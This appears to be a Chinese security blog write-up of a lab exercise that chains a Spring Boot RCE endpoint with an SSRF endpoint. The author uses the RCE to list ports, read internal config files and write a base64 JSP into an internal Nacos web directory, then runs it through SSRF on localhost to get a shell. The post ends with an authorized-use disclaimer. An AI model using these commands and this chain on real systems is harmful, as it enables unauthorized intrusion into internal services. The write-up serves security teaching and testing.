#  微服务场景下 RCE 和 SSRF 的⼀次组合利⽤  
原创 旱柚
                    旱柚  汤池杂货铺   2026-05-10 20:21  
  
   
  
  
# 前言  
  
随着微服务架构在业务系统中的广泛应用，漏洞利用往往不再局限于单一服务本身，而是与服务部署方式、内部访问关系以及组件解析能力密切相关。  
  
本思路来源于某次项目中的实际场景，  
抛开直接利用RCE漏洞本身不谈，本文重点围绕 RCE 与 SSRF 的组合利用展开，通过 RCE 实现文件写入，借助 SSRF 访问内部web服务，从而规避 Spring Boot 无法直接解析 JSP 的限制。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2r1REgdXKkotRNZg6UQLv5ftkWp0xx0o6SziamWgU6Glq8kWPrkTpyc6l44b1D4TiaQDIQHlxXczIjv59lBokiciaaZ0RYbsdrnA2bIfslVXKko/640?wx_fmt=png&from=appmsg "")  
# 靶场拓扑  
  
外部入口：  
```
http://192.168.5.10:8080
```  
  
内部服务只有 127.0.0.1 可访问：  
```
127.0.0.1:8848/nacos/127.0.0.1:8081/
```  
  
漏洞接口设计如下：  
```
命令执行接口：/rce?cmd=SSRF 接口：/ssrf?url=
```  
# 第一步：Spring Boot RCE 触发  
  
验证命令执行接口：  
```
'http://192.168.5.10:8080/rce?cmd=id'
```  
  
执行结果：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2r1REgdXKkpro5e2jQ3o0GUoibAQepTQIEqd0jpGSjSDBJ8MwNcXrfHyYusxePHfrtsWFo5HKuwvrgk792H4gNLvxziaRKqbO3Ag7bmvUJ4WA/640?wx_fmt=png&from=appmsg "")  
# 第二步：Spring Boot 默认不解析JSP  
  
很多传统 Java Web 利用思路是：  
```
RCE -> 写入 xxx.jsp -> 浏览器访问 xxx.jsp -> JSP 被解析执行
```  
  
Spring Boot 服务却不太一样，Spring Boot 通常通过内置 Tomcat 启动业务接口，并不启用传统 JSP 解析链路。即使能把 .jsp  
 写到Spring Boot 可访问目录后，通常不会触发解析执行，而是被当作普通静态资源处理，表现为文件下载、源码输出等。  
  
尝试访问 Spring Boot 可访问目录中写入的 JSP时：  
```
'http://192.168.5.10:8080/static/test.jsp'
```  
  
写入 test.jsp 后，访问即下载对应文件：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2r1REgdXKkoTdQtmcJicC2ibFDSE3ga6OZHGaR9icJCzoC3z9ATYAibxakG7VUGJ01Uanjb7O1n2ecSN6zW3Fpb5urlAMT6JhTmF9UkEWfME1F8/640?wx_fmt=png&from=appmsg "")  
  
在 Spring Boot 配置下，可能表现为直接返回源码、下载文件、静态文本输出等。也没有纠结于 Spring Boot 写入文件 Getshell 了。  
# 第三步：发现本地 Web 服务  
  
利用 RCE 进行主机信息收集，确认主机进程、监听端口、启动参数、服务配置文件。  
## 1. 查看监听端口  
  
先通过 RCE 查看当前环境监听端口：  
```
'http://192.168.5.10:8080/rce?cmd=ss%20-lntp'
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2r1REgdXKkrKRXClnO9JjbLf3IiaI30BkJh7NHz3pZL2ZLsDRabaEKX0hYYMqy27OakicjWGPA2wGFUqOugLMtPdqe1udwFP0qcwiaudRxUe4U/640?wx_fmt=png&from=appmsg "")  
  
关键结果：  
```
State   Recv-Q Send-Q Local Address:Port        Peer Address:Port  ProcessLISTEN  0      4096   127.0.0.11:46351          0.0.0.0:*          -LISTEN  0      1      [::ffff:127.0.0.1]:18006  *:*                -LISTEN  0      1      [::ffff:127.0.0.1]:18005  *:*                -LISTEN  0      100    *:8848                    *:*                -LISTEN  0      100    *:8081                    *:*                -LISTEN  0      100    *:8080                    *:*                users:(("java",pid=7,fd=18))
```  
  
这里可以看到，除了外部访问的 8080  
，环境里还存在 8848  
 服务。  
  
直接访问 8848  
 失败：  
```
'http://192.168.5.10:8848/nacos/'
```  
  
报错无法连接服务端：  
```
curl: (7) Failed to connect to 192.168.5.10 port 8848 after 1 ms: Couldn't connect to server
```  
  
这说明 8848  
 并不是直接对外暴露的入口，仅在服务端本地网络视角可访问，外部无法直接访问。  
## 2. 查看进程和启动参数  
  
继续通过 RCE 查看文件发现两个可疑 Web 目录：  
```
/host/nacos-webapps/host/tomcat-webapps
```  
  
两个路径对应如下：  
```
/host/nacos-webapps  -> nacos-local:/usr/local/tomcat/webapps/nacos/host/tomcat-webapps -> tomcat-local:/usr/local/tomcat/webapps/ROOT
```  
  
也就是说，虽然当前 Spring Boot 服务虽然自身不具备 JSP 解析能力，但在同一微服务环境中，它具备其他 Web 服务应用目录解析 JSP 的条件。  
## 3. 定位并读取配置文件  
  
发现可疑 Web 目录后，读取配置文件。  
```
Nacos'http://192.168.5.10:8080/rce?cmd=cat%20/host/nacos-webapps/WEB-INF/classes/application.properties'Tomcat'http://192.168.5.10:8080/rce?cmd=cat%20/host/tomcat-webapps/WEB-INF/classes/application.properties'
```  
  
Nacos  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2r1REgdXKkpNp51s7yuUAjxZIBRiadpNcPs4lQWibMUx7nzd7WqTt6GRibhcp0jvsevbjMQ68n0STJPVdw8QFqNHENKA1DX0YVYtbdTceT1g9s/640?wx_fmt=png&from=appmsg "")  
  
Tomcat  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2r1REgdXKkqbwWbupuhLxCS8sb8sTSiaUr0Egfh8ibnSZluyYIAsoVdnEppVk069aa759Coc5raGqVvmJEFV5cRU28cLa8vTtZOVk1bibnFb2g/640?wx_fmt=png&from=appmsg "")  
  
Nacos 配置内容：  
```
server.port=8848server.address=127.0.0.1server.servlet.context-path=/nacosweb.root=/usr/local/tomcat/webapps/nacoshost.visible.path=/host/nacos-webappsservice.name=nacos-localaccess.policy=localhost-only
```  
  
Tomcat 配置内容：  
```
server.port=8081server.address=127.0.0.1web.root=/usr/local/tomcat/webapps/ROOThost.visible.path=/host/tomcat-webappsservice.name=tomcat-localaccess.policy=localhost-only
```  
  
到这里，链路已经明确：  
```
1. Spring Boot 有 RCE2. Spring Boot 不解析 JSP3. 同服务器下存在 8848 Nacos/ 8081 Tomcat 4. 8848 和 8081 只允许服务端本地访问5. RCE 可以写入 /host/nacos-webapps 和 /host/tomcat-webapps6. /host/nacos-webapps 和 /host/tomcat-webapps 可能会被作为 Web 目录解析
```  
# 第四步：通过 RCE 写入 Nacos 的 Web 目录  
  
由于命令行和 URL 转义比较麻烦，可以将 JSP 内容做 Base64 后写入。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2r1REgdXKkr3krvYQAhup1pkPKVibO3mjRcrt6vuRXnSf8nmCuf66owAiaA5ctbic3QOhJCNCfIXTEXVYypRGIPgZOznw5IJ8UONzadbqsk06c/640?wx_fmt=png&from=appmsg "")  
```
curl --noproxy '*' -G \  --data-urlencode "cmd=printf '%s' 'PCUgb3V0LnByaW50bG4oIlRlc3QiKTsgJT4=' | base64 -d > /host/nacos-webapps/test.jsp && ls -l /host/nacos-webapps/test.jsp" \  'http://192.168.5.10:8080/rce'
```  
  
写入成功：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2r1REgdXKkryLHYuIeQGibcUkI2as7YVAdLVBJoycYlSYqp0o4GEXdVKUaTIMjlaUgksEc65AYg6eRAnYIBkqm3zkaNl7SArY1zPrPQIn1uE/640?wx_fmt=png&from=appmsg "")  
  
此时 JSP 并不是写到了 Spring Boot 的相关目录，而是写到了内部服务 Nacos 的目录下。  
  
需要注意访问路径和写入路径的对应关系：  
```
写入路径：/host/nacos-webapps/test.jsp实际 WebRoot：/usr/local/tomcat/webapps/nacos内网访问路径：http://127.0.0.1:8848/nacos/test.jsp外部触发路径：http://192.168.5.10:8080/ssrf?url=127.0.0.1:8848/nacos/test.jsp
```  
# 第五步：SSRF 突破网络限制实现解析  
  
外部无法直接访问：  
```
127.0.0.1:8848/nacos/test.jsp
```  
  
SSRF 漏洞接口突破网络，可以访问到内部回环地址：  
```
http://192.168.5.10:8080/ssrf?url=127.0.0.1:8848/nacos/test.jsp
```  
  
访问解析成功，输出 Test  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2r1REgdXKkpZgPfKJfpiafS9WicIjfsmxkLRSu0uibhBLjjQfTialCeic4TBBc8RIrzLlZXt8niczVrJdRKKh3IWt25ibdrDzSmicllkbrO5SjrzWMo/640?wx_fmt=png&from=appmsg "")  
  
如果 JSP 是简单命令执行型，可以通过 URL 参数触发：  
```
'http://192.168.5.10:8080/ssrf?url=127.0.0.1:8848/nacos/test.jsp%3Fcmd=id'
```  
# 最终利用链路：  
```
Spring Boot RCE  -> 尝试写 Spring Boot Web 路径但是无法解析，访问即下载  -> 通过 RCE 查看端口、进程、配置文件  -> 发现存在仅 127.0.0.1 可访问的 Nacos / Tomcat 服务  -> RCE 写 JSP 到 Nacos Web 目录  -> SSRF 访问 127.0.0.1:8848 触发 JSP 解析成功 Getshell
```  
# 结语  
  
Spring Boot 场景下 RCE 一般无法通过文件 Getshell ，其部署方式通常不会提供 JSP 解析能力。  
  
但在微服务或混合部署环境中，如果同宿主机还存在 Nacos、Tomcat 等具备 JSP 解析能力的 Web 容器，并且存在 SSRF 可以访问 127.0.0.1  
 本地服务，就可能形成完整的组合利用链路。  
  
# 严正声明  
  
本文所涉及的微服务场景下 RCE、SSRF、容器挂载、本地回环访问及相关组合利用思路，仅用于合法授权前提下的安全研究、安全测试、攻防演练与风险验证，旨在帮助安全从业人员识别微服务架构中的潜在攻击面与安全隐患，提高系统安全防护能力。  
凡利用本文内容对任何网络、系统、平台或第三方服务实施未授权行为的，均属于违法行为，由行为人自行承担全部法律责任，与本文作者及发布方无关。  
  
安全研究的目的在于推动安全建设，而非破坏系统安全。技术本身不具备善恶属性，边界在于法律与授权。请严格遵守所在地法律法规、行业规范及网络安全伦理，合法、合规、审慎地开展相关研究与测试工作。  
  
  
